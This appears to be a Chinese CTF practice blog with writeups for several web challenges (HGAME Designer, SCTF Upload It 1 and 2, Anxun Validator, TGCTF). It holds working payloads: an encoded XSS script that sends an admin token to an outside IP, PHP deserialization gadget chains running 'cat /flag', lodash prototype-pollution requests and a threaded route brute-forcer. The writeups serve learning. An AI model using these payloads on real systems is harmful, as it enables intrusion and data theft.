JWT签名密钥（生产环境中应使用更安全的密钥存储方式） // 认证中间件，用于保护需要授权的路由 function auth(req, res, next) { const token = req.headers[\u0026#34;authorization\u0026#34;] // 从请求头获取授权令牌 if (!token) { return res.redirect(\u0026#34;/\u0026#34;) // 如果没有令牌，重定向到注册页面 } try { const decoded = jwt.verify(token, secret) || {} // 验证JWT令牌 req.user = decoded // 将解码后的用户信息挂载到请求对象 } catch (error) { return res.status(500).json({ msg: \u0026#34;jwt decode error\u0026#34; }) // 如果验证失败，返回错误响应 } next() // 如果验证成功，继续处理请求 } // GET / - 渲染注册页面 app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { res.render(\u0026#34;register\u0026#34;) // 渲染register.ejs模板 }) // POST /user/register - 处理用户注册请求 app.post(\u0026#34;/user/register\u0026#34;, (req, res) =\u0026gt; { const username = req.body.username // 获取请求体中的用户名 // 如果用户名是admin且请求来自本地，返回真实flag，否则返回假flag let flag = \u0026#34;hgame{fake_flag_here}\u0026#34; if (username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; (req.ip == \u0026#34;127.0.0.1\u0026#34; | | req.ip == \u0026#34;::ffff:127.0.0.1\u0026#34;)) { flag = \u0026#34;hgame{true_flag_here}\u0026#34; } // 生成JWT令牌，包含用户名和flag const token = jwt.sign({ username, flag }, secret) res.json({ token }) // 返回包含令牌的JSON响应 }) // GET /user/info - 获取用户信息（受保护路由） app.get(\u0026#34;/user/info\u0026#34;, auth, (req, res) =\u0026gt; { res.json({ username: req.user.username, // 返回用户名 flag: req.user.flag // 返回flag（敏感信息） }) }) // POST /button/save - 保存按钮样式设置（受保护路由） app.post(\u0026#34;/button/save\u0026#34;, auth, (req, res) =\u0026gt; { req.user.style = {} // 初始化用户样式属性 // 保存请求体中的所有样式设置 for (const key in req.body) { req.user.style[key] = req.body[key] } // 生成新的JWT令牌，包含更新后的用户信息 const token = jwt.sign(req.user, secret) res.json({ token }) // 返回新的令牌 }) // GET /button/get - 获取按钮样式设置（受保护路由） app.get(\u0026#34;/button/get\u0026#34;, auth, (req, res) =\u0026gt; { const style = req.user.style || {} // 获取用户保存的样式设置 res.json({ style }) // 返回样式设置 }) // GET /button/edit - 渲染按钮编辑页面 app.get(\u0026#34;/button/edit\u0026#34;, (req, res) =\u0026gt; { res.render(\u0026#34;button\u0026#34;) // 渲染button.ejs模板 }) // POST /button/share - 处理按钮分享请求（受保护路由） app.post(\u0026#34;/button/share\u0026#34;, auth, async (req, res) =\u0026gt; { try { // 启动Puppeteer无头浏览器 const browser = await puppeteer.launch({ headless: true, executablePath: \u0026#34;/usr/bin/chromium\u0026#34;, // 指定Chromium路径 args: [\u0026#39;--no-sandbox\u0026#39;] // 禁用沙盒以适应Docker环境 }) const page = await browser.newPage() // 创建新页面 // 构建预览URL const query = querystring.encode(req.body) await page.goto(`http://127.0.0.1:9090/button/preview?${query}`) // 在页面上下文中设置本地存储令牌（模拟用户认证） await page.evaluate(() =\u0026gt; { return localStorage.setItem(\u0026#34;token\u0026#34;, \u0026#34;jwt_token_here\u0026#34;) }) // 点击页面上的按钮 await page.click(\u0026#34;#button\u0026#34;) res.json({ msg: \u0026#34;admin will see it later\u0026#34; }) // 返回成功响应 } catch (error) { console.error(\u0026#34;Puppeteer error:\u0026#34;, error) res.status(500).json({ msg: \u0026#34;Error processing request\u0026#34; }) // 捕获并处理错误 } }) // GET /button/preview - 渲染按钮预览页面 app.get(\u0026#34;/button/preview\u0026#34;, (req, res) =\u0026gt; { // 定义黑名单，禁止特定属性和值 const blacklist = [ /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/ ] // 对查询参数进行安全过滤 for (const key in req.query) { for (const item of blacklist) { if (item.test(key.trim()) || item.test(req.query[key].trim())) { req.query[key] = \u0026#34;\u0026#34; // 清空匹配黑名单的内容 } } } // 渲染preview.ejs模板，传入过滤后的查询参数 res.render(\u0026#34;preview\u0026#34;, { data: req.query }) }) // 启动Express服务器，监听9090端口 app.listen(9090, () =\u0026gt; { console.log(\u0026#34;Server is running on http://localhost:9090\u0026#34;) }) 看下面发现只有本地用户和admin才能拿flag，但是伪造xxf头失效。\n继续审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 app.post(\u0026#34;/button/share\u0026#34;, auth, async (req, res) =\u0026gt; { try { // 启动Puppeteer无头浏览器 const browser = await puppeteer.launch({ headless: true, executablePath: \u0026#34;/usr/bin/chromium\u0026#34;, // 指定Chromium路径 args: [\u0026#39;--no-sandbox\u0026#39;] // 禁用沙盒以适应Docker环境 }) #定义一个异步的无界面的模拟浏览器 const page = await browser.newPage() // 创建新页面 // 构建预览URL const query = querystring.encode(req.body) await page.goto(`http://127.0.0.1:9090/button/preview?${query}`) // 在页面上下文中设置本地存储令牌（模拟用户认证） await page.evaluate(() =\u0026gt; { return localStorage.setItem(\u0026#34;token\u0026#34;, \u0026#34;jwt_token_here\u0026#34;) }) // 点击页面上的按钮 await page.click(\u0026#34;#button\u0026#34;) res.json({ msg: \u0026#34;admin will see it later\u0026#34; }) // 返回成功响应 } catch (error) { console.error(\u0026#34;Puppeteer error:\u0026#34;, error) res.status(500).json({ msg: \u0026#34;Error processing request\u0026#34; }) // 捕获并处理错误 } }) 该代码会启动浏览器访问分享页面，这使XSS注入成为可能。（这里的page.goto是在服务端完成的，这很重要，也决定了我们为什么能用xss）\n再看/button/previe路由，一串黑名单，过滤的内容都是跟xss行为有关的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 app.get(\u0026#34;/button/preview\u0026#34;, (req, res) =\u0026gt; { // 定义黑名单，禁止特定属性和值 const blacklist = [ /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/ ] // 对查询参数进行安全过滤 for (const key in req.query) { for (const item of blacklist) { if (item.test(key.trim()) || item.test(req.query[key].trim())) { req.query[key] = \u0026#34;\u0026#34; // 清空匹配黑名单的内容 } } } // 渲染preview.ejs模板，传入过滤后的查询参数 res.render(\u0026#34;preview\u0026#34;, { data: req.query }) #query去访问preview渲染的模板 }) 所以就到了preview.ejs代码\n1 2 3 4 5 \u0026lt;a class=\u0026#34;button\u0026#34; id=\u0026#34;button\u0026#34; style=\u0026#34;\u0026lt;% for (const key in data) { %\u0026gt;\u0026lt;%- key %\u0026gt;:\u0026lt;%- data[key] %\u0026gt; ;\u0026lt;% }; %\u0026gt;\u0026#34; \u0026gt;CLICK ME\u0026lt;/a\u0026gt; 1 jsp和flask，ejs将\u0026lt;% …..%\u0026gt;之间的内容解析为js代码**，data就是我们传入的这些json对象,key就是json对象中的键值,data[key]便是对应的值。因为是用拼接的形式来进行style定义的，所以我们可以通过提前闭合style定义的语句然后插入script代码来进行xss。 所以思路就是\n1 利用share跳转到preview再上xss, 构造语句让这个浏览器对象访问register路由并且返回给我们的vps token就可以了 所以构造的脚本是\n1 $.post(\u0026#34;/user/register\u0026#34;,{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;},function(result){document.location=\u0026#39;http://101.200.39.193:5000?c=\u0026#39;+JSON.stringify(result)}); 将这个base64编码再去等号后，放到下方代码（atob函数可以规避黑名单的检测,这里要记得加eval执行），\u0026quot;\u0026gt;进行提取闭合。\n1 \u0026#34;\u0026gt;\u0026lt;script\u0026gt;eval(atob(\u0026#39;JC5wb3N0KCIvdXNlci9yZWdpc3RlciIseyJ1c2VybmFtZSI6ImFkbWluIn0sZnVuY3Rpb24ocmVzdWx0KXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEwMS4yMDAuMzkuMTkzOjUwMDA/Yz0nK0pTT04uc3RyaW5naWZ5KHJlc3VsdCl9KTs\u0026#39;));\u0026lt;/script\u0026gt; vps开监听。打到preview路由试试\nvps有回显了\n解密是错的flag，那没错了（没有本地ip。所以接下来通过传share，用本地ip经过跳转访问register拿flag）\n接下来就打share\nHGAME-2023-week2 Designer-复现 | Lanb0\u0026rsquo;s blog|一个默默无闻的网安爱好者\nHGame 2023 Week2 部分Writeup_v2board 越权-CSDN博客\nHGAME 2023 week2]Designer nanamo的WriteUp | NSSCTF\n4.22 [SCTF 2021]upload it 1-session反序列化 看附件，composer.json中有两个组件，要下载\n所以先下载composerComposer\n再在composer.json这个目录执行composer install（为了执行后面的反序列化代码，symfony/string：操作字符串，opis/closure：序列化闭包）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 \u0026lt;?php // 导入 Composer 自动加载文件 include_once \u0026#34;../vendor/autoload.php\u0026#34;; // 禁用错误报告 error_reporting(0); // 启动 PHP 会话 session_start(); // 定义文件上传基础路径 define(\u0026#34;UPLOAD_PATH\u0026#34;, \u0026#34;/tmp/sandbox\u0026#34;); // 如果上传路径不存在，则尝试创建该目录 if (!file_exists(UPLOAD_PATH)) { @mkdir(UPLOAD_PATH); } // 定义创建用户上传目录的函数 function make_user_upload_dir() { // 使用远程地址和会话 ID 生成唯一目录名（确保每个用户有独立的上传目录） $md5_dir = md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] . session_id()); // 拼接完整的上传路径 $upload_path = UPLOAD_PATH . \u0026#34;/\u0026#34; . $md5_dir; // 创建用户上传目录 @mkdir($upload_path); // 将上传路径存储到会话中，供后续文件上传使用 $_SESSION[\u0026#34;upload_path\u0026#34;] = $upload_path; } // 如果会话中尚未存储上传路径，则调用函数创建用户上传目录 if (empty($_SESSION[\u0026#34;upload_path\u0026#34;])) { make_user_upload_dir(); } // 处理文件上传请求 if (!empty($_FILES[\u0026#39;file\u0026#39;])) { // 获取上传的文件信息 $file = $_FILES[\u0026#39;file\u0026#39;]; // 判断文件大小是否小于 1MB（限制上传文件大小） if ($file[\u0026#39;size\u0026#39;] \u0026lt; 1024 * 1024) { // 如果设置了自定义上传路径 if (!empty($_POST[\u0026#39;path\u0026#39;])) { // 拼接完整的上传文件路径（包含自定义路径） $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$_POST[\u0026#39;path\u0026#39;]; // 拼接最终的上传文件名 $upload_file = $upload_file_path.\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } else { // 使用默认上传路径 $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;]; // 拼接最终的上传文件名 $upload_file = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } // 尝试将上传的文件移动到指定位置 if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $upload_file)) { // 如果移动成功，输出成功消息并显示文件保存路径 echo \u0026#34;OK! Your file saved in: \u0026#34; . $upload_file; } else { // 如果移动失败，输出失败消息 echo \u0026#34;emm...Upload failed:(\u0026#34;; } } else { // 如果文件大小超过限制，输出提示信息 echo \u0026#34;too big!!!\u0026#34;; } } else if (!empty($_GET[\u0026#39;phpinfo\u0026#39;])) { // 如果请求了 phpinfo 信息，则输出 PHP 环境配置信息 phpinfo(); exit(); } else { // 默认输出上传页面和 phpinfo 链接 echo \u0026lt;\u0026lt;\u0026lt;CODE \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Upload\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 文件上传表单 --\u0026gt; \u0026lt;h1\u0026gt;Upload files casually XD\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; FILE: \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;!-- 文件选择输入框 --\u0026gt; PATH: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;path\u0026#34;\u0026gt; \u0026lt;!-- 自定义上传路径输入框 --\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;!-- 提交按钮 --\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;!-- phpinfo 链接 --\u0026gt; \u0026lt;h3\u0026gt;or...Just look at the phpinfo?\u0026lt;/h3\u0026gt; \u0026lt;a href=\u0026#34;./index.php?phpinfo=1\u0026#34;\u0026gt;go to phpinfo\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; CODE; } 审计代码发现文件上传路径可控\n但是测试发现只有../../../tmp目录及其子目录才可以写入（比如../../../../../../../tmp）\n由前面下载组件的操作很容易联想到反序列化，所以来找一下可以触发反序列化的地方\n先进入phpinfo看看session，发现session.save_path为no value即是默认的/tmp/sess_SESSIONID。\nserialize_handler设置为php，所以session文件格式应该为\u0026lt;元素名\u0026gt;|\u0026lt;元素值的序列化数据\u0026gt;，PHP在取元素值的时候会先对元素值进行反序列化，那么这里就是我们要找的反序列化点了。\n原理+实践掌握(PHP反序列化和Session反序列化)-先知社区\n这个session反序化思路，我们需要构造一个序列化payload，然后上传到/tmp/sess_xxx后，使用我们上传的sessID再上传一次文件达到触发反序列化的效果（因为我们传入文件是放在session中，所以我们将文件名改为sess_自己的PHPSESSION,从而覆盖session文件，然后我们重新访问，把我们命令执行的结果带出来，得到flag）\n怎么写代码呢？看刚刚下载的组件后出现的代码里面找找，在\\vendor\\opis\\closure\\src\\SerializableClosure.php中发现了call_user_func_array，这个就是执行命令的点\n在Symfony\\Component\\String\\LazyString.php发现sleep函数\n序列化传入这个然后触发__sleep，然后触发toString,里面的属性可控\n1 return $this-\u0026gt;value = ($this-\u0026gt;value)(); 将写的脚本test.php与autoload.php放在一起（刚刚下载的组件后出现目录里有）\n运行有（传入func的目的是对$closure进行赋值，然后通过call_user_func_array进行执行命令。）\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php namespace Symfony\\Component\\String; class LazyString{ private $value; public function __construct(){ require \u0026#34;autoload.php\u0026#34;; $a = function(){system(\u0026#34;cat /flag\u0026#34;);}; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-\u0026gt;value=$b; } } print(\u0026#34;upload_path|\u0026#34;.serialize(new LazyString())); 1 总结链子：sleep-\u0026gt;toString-\u0026gt;SerializableClosure#invoke 然后打入\n重新发包访问\nNSSCTF{dc0d6ec6-fb4b-4df4-a163-5168656f37d1}\nSCTF-2021 部分WriteUp - SecPulse.COM | 安全脉搏\n[SCTF 2021]Upload It 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 \u0026lt;?php include_once \u0026#34;../vendor/autoload.php\u0026#34;; error_reporting(0); session_start(); define(\u0026#34;UPLOAD_PATH\u0026#34;, \u0026#34;/tmp/sandbox\u0026#34;); if (!file_exists(UPLOAD_PATH)) { @mkdir(UPLOAD_PATH); } // emmm...easy backdoor class sandbox { private $evil; public $upload_path; public function make_user_upload_dir() { $md5_dir = md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] . session_id()); $this-\u0026gt;upload_path = UPLOAD_PATH . \u0026#34;/\u0026#34; . $md5_dir; @mkdir($this-\u0026gt;upload_path); $_SESSION[\u0026#34;upload_path\u0026#34;] = $this-\u0026gt;upload_path; } public function has_upload_dir() { return !empty($_SESSION[\u0026#34;upload_path\u0026#34;]); } public function __wakeup() { /* I removed this code because it was too dangerous. */ throw new Error(\u0026#34;NO NO NO\u0026#34;); } public function __destruct() { /* I removed this code because it was too dangerous. */ } public function __call($func, $value) { if (method_exists($this, $func)) { call_user_func_array( [$this, $func], $value ); } } private function backdoor() { // __destruct and __wakeup are deleted. It looks like backdoor should not be called. include_once $this-\u0026gt;evil; } } $box = new sandbox(); if (!$box-\u0026gt;has_upload_dir()) { $box-\u0026gt;make_user_upload_dir(); } if (!empty($_FILES[\u0026#39;file\u0026#39;])) { $file = $_FILES[\u0026#39;file\u0026#39;]; if ($file[\u0026#39;size\u0026#39;] \u0026lt; 1024 * 1024) { if (!empty($_POST[\u0026#39;path\u0026#39;])) { $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$_POST[\u0026#39;path\u0026#39;]; $upload_file = $upload_file_path.\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } else { $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;]; $upload_file = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $upload_file)) { echo \u0026#34;OK! Your file saved in: \u0026#34; . $upload_file; } else { echo \u0026#34;emm...Upload failed:(\u0026#34;; } } else { echo \u0026#34;too big!!!\u0026#34;; } } else if (!empty($_GET[\u0026#39;phpinfo\u0026#39;])) { phpinfo(); exit(); } else { echo \u0026lt;\u0026lt;\u0026lt;CODE } 1 思路和上题一样，不同的地方在于依赖中没有了opis/closure，不过题目中新增了一个sandbox类，里面的backdoor方法可以进行文件包含。 1 总结链子：sleep-\u0026gt;toString-\u0026gt;sandbox#__call-\u0026gt;sandbox#backdoor\t#这里我们给 $this-\u0026gt;value为数组模式触发__call调用backdoor进行文件包含 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php namespace Symfony\\Component\\String{ class LazyString{ public $value; public function __construct($value){ $this-\u0026gt;value = $value; } } } namespace { class sandbox { public $evil; public function __construct(){ $this-\u0026gt;evil = \u0026#34;/flag\u0026#34;; } } use Symfony\\Component\\String\\LazyString; $value = [new sandbox,\u0026#34;backdoor\u0026#34;]; $lazy = new LazyString($value); echo \u0026#34;upload_path |\u0026#34;.serialize($lazy); } #upload_path |O:35:\u0026#34;Symfony\\Component\\String\\LazyString\u0026#34;:1:{s:5:\u0026#34;value\u0026#34;;a:2:{i:0;O:7:\u0026#34;sandbox\u0026#34;:1:{s:4:\u0026#34;evil\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;}i:1;s:8:\u0026#34;backdoor\u0026#34;;}} 接下来就跟上面一样了，打完payload再重新发包看见flag\n4.23 [D3CTF 2019]babyxss 这个太难了，不会写\n4.24 lodash 4.17.16 原型污染漏洞 [安洵杯 2020]Validator\n先目录扫描然后进入app.js拿到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 const express = require(\u0026#39;express\u0026#39;) const express_static = require(\u0026#39;express-static\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const app = express() const port = 9000 app.use(express.json()) app.use(express.urlencoded({ extended: true })) let info = [] const { body, validationResult } = require(\u0026#39;express-validator\u0026#39;) middlewares = [ body(\u0026#39;*\u0026#39;).trim(), body(\u0026#39;password\u0026#39;).isLength({ min: 6 }), ] app.use(middlewares) readFile = function (filename) { var data = fs.readFileSync(filename) return data.toString() } app.post(\u0026#34;/login\u0026#34;, (req, res) =\u0026gt; { console.log(req.body) const errors = validationResult(req); if (!errors.isEmpty()) { return res.status(400).json({ errors: errors.array() }); } if (req.body.password == \u0026#34;D0g3_Yes!!!\u0026#34;){ console.log(info.system_open) if (info.system_open == \u0026#34;yes\u0026#34;){ const flag = readFile(\u0026#34;/flag\u0026#34;) return res.status(200).send(flag) }else{ return res.status(400).send(\u0026#34;The login is successful, but the system is under test and not open...\u0026#34;) } }else{ return res.status(400).send(\u0026#34;Login Fail, Password Wrong!\u0026#34;) } }) app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { const login_html = readFile(path.join(__dirname, \u0026#34;login.html\u0026#34;)) return res.status(200).send(login_html) }) app.use(express_static(\u0026#34;./\u0026#34;)) app.listen(port, () =\u0026gt; { console.log(`server listening on ${port}`) }) 审计发现关键代码\n1 2 3 4 if (req.body.password == \u0026#34;D0g3_Yes!!!\u0026#34;){ console.log(info.system_open) if (info.system_open == \u0026#34;yes\u0026#34;){ const flag = readFile(\u0026#34;/flag\u0026#34;) 先password == \u0026ldquo;D0g3_Yes!!!\u0026ldquo;试试\n没用，说明这里要进行污染info.system_open的值为yes就行\n直接打\n1 2 3 4 5 { \u0026#34;password\u0026#34;: \u0026#34;D0g3_Yes!!!\u0026#34;, \u0026#34;__proto__\u0026#34;: { \u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34; } 发现没用\n访问/package.json\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;name\u0026#34;: \u0026#34;validator\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;app.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;express\u0026#34;: \u0026#34;^4.17.1\u0026#34;, \u0026#34;express-static\u0026#34;: \u0026#34;^1.2.6\u0026#34;, \u0026#34;express-validator\u0026#34;: \u0026#34;^6.6.0\u0026#34;, \u0026#34;fs\u0026#34;: \u0026#34;0.0.1-security\u0026#34;, \u0026#34;lodash\u0026#34;: \u0026#34;^4.17.16\u0026#34; } } 问一下gpt，发现lodash 4.17.16 也存在原型污染漏洞，而odash 4.17.17 及以上版本修复了，那么很可能考这个。\n网上找了文章学习一下\nhttps://threezh1.com/2020/10/31/express-validator%206.6.0%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/\n然后改一下参数就可以打\n1 {\u0026#34;a\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;test\u0026#34;: \u0026#34;testvalue\u0026#34;}}, \u0026#34;a\\\u0026#34;].__proto__[\\\u0026#34;test\u0026#34;: 222} 所以直接login打payload就行，注意改Content-Type: application/json\n1 {\u0026#34;password\u0026#34;:\u0026#34;D0g3_Yes!!!\u0026#34;, \u0026#34;a\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34;}}, \u0026#34;a\\\u0026#34;].__proto__[\\\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34; } 直接打代码也行\n1 2 3 4 5 6 7 8 import requests as req target = \u0026#39;http://node4.anna.nssctf.cn:28126/login\u0026#39; data = { \u0026#39;password\u0026#39;: \u0026#34;D0g3_Yes!!!\u0026#34;, \u0026#34;a\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34;}}, \u0026#34;a\\\u0026#34;].__proto__[\\\u0026#34;system_open\u0026#34;: \u0026#34;no\u0026#34; } res = req.post(url=target, json=data) print(res.text) 官方wp引用了上文关于Prototype Pollution Attack的二三事-先知社区，讲的很详细\n","date":"2025-04-18T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/","title":"2025-nss-每日一题"},{"content":" web 火眼辩魑魅 进去说shell学姐，显然访问tgshell。\n直接打phpinfo();发现命令可以执行，但是继续执行发现禁了很多，但是发现反引号没禁。\n1 但是上面竟然是非预期，wp是打smarty模板注入（看框架是php然后联系ip可以想到在xff打Smarty模板注入） 直面天命 提示有个路由，看描述不出意外是爆破路由，用bp爆太慢了，直接ai写个代码爆，得到aazz\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import requests import itertools from concurrent.futures import ThreadPoolExecutor # ===== 目标配置 ===== TARGET = \u0026#34;http://node2.tgctf.woooo.tech:32668\u0026#34; THREADS = 30 # 并发线程数 TIMEOUT = 5 # 请求超时(秒) # ===== 路由生成器 ===== def generate_routes(): chars = \u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39; for combo in itertools.product(chars, repeat=4): yield \u0026#39;/\u0026#39; + \u0026#39;\u0026#39;.join(combo) # ===== 有效性验证 ===== def check_route(route): try: url = TARGET + route resp = requests.get(url, timeout=TIMEOUT) # 有效性判断逻辑（综合状态码和内容特征） if resp.status_code == 200: # 过滤默认页面/无效页面（参考网页1的\u0026#34;var resultInfo\u0026#34;逻辑） if len(resp.text) \u0026gt; 100 and \u0026#34;404\u0026#34; not in resp.text: return True, route, len(resp.text) except Exception as e: pass return False, None, 0 # ===== 主爆破逻辑 ===== found_routes = [] def brute_worker(route): global found_routes if len(found_routes) \u0026gt;= 2: return valid, path, length = check_route(route) if valid: found_routes.append((path, length)) print(f\u0026#34;\\033[32m[+] 发现有效路由: {path} (响应长度: {length})\\033[0m\u0026#34;) # 找到两个立即停止 if len(found_routes) \u0026gt;= 2: executor.shutdown(wait=False, cancel_futures=True) # ===== 执行爆破 ===== if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;开始路由爆破，目标为4位小写字母组合...\u0026#34;) with ThreadPoolExecutor(max_workers=THREADS) as executor: futures = [] for route in generate_routes(): if len(found_routes) \u0026lt; 2: futures.append(executor.submit(brute_worker, route)) else: break # 打印最终结果 print(\u0026#34;\\n=== 爆破结果 ===\u0026#34;) if found_routes: for i, (route, length) in enumerate(found_routes): print(f\u0026#34;路由{i + 1}: {TARGET}{route} (响应长度: {length})\u0026#34;) else: print(\u0026#34;未发现有效路由\u0026#34;) 然后源码提示有参数，直接用arjun爆破得到filename\n解法一：ssti 然后直接读源码app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key app = Flask(__name__) black_list=[\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;] def waf(name): for x in black_list: if x in name.lower(): return True return False def is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): template1=\u0026#34;\u0026#34; template2=\u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; if waf(name): template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\u0026lt;br\u0026gt;\u0026lt;img src=\u0026#34;{{ url_for(\u0026#34;static\u0026#34;, filename=\u0026#34;3.jpeg\u0026#34;) }}\u0026#34; alt=\u0026#34;Image\u0026#34;\u0026gt;\u0026#39; else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;再去西行历练历练\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;img src=\u0026#34;{{ url_for(\u0026#34;static\u0026#34;, filename=\u0026#34;4.jpeg\u0026#34;) }}\u0026#34; alt=\u0026#34;Image\u0026#34;\u0026gt;\u0026#39; return render_template_string(template) template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\u0026lt;br\u0026gt;最后，如果你用了cat，就可以见到齐天大圣了\u0026lt;br\u0026gt;\u0026#34; template= template.replace(\u0026#34;直面\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;天命\u0026#34;,\u0026#34;}}\u0026#34;) template = template if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39;\u0026lt;br\u0026gt;或许你这只叫天命人的猴子，真的能做到？\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;img src=\u0026#34;{{ url_for(\u0026#34;static\u0026#34;, filename=\u0026#34;2.jpeg\u0026#34;) }}\u0026#34; 